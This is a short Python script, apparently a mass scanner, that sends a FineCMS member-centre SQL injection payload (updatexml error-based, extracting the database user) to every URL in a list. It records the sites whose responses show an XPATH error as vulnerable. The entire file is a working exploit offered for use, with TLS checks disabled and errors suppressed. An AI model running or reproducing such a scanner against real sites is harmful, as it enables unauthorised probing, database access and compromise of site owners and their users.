import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0"
}

for url in open("Finecms.txt"):
    try:
        url = url.replace("\n", "")
        print(url+"检测中----\n\n")
        jiaoyan = requests.get(url+"/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a", headers=headers, verify=False, timeout=5)
        if ("XPATH syntax error" in jiaoyan.text):
            with open("FineCMS 会员中心 sql注入 vul.txt", "a+") as f:
                f.write(url+"\n")
    except:
        continue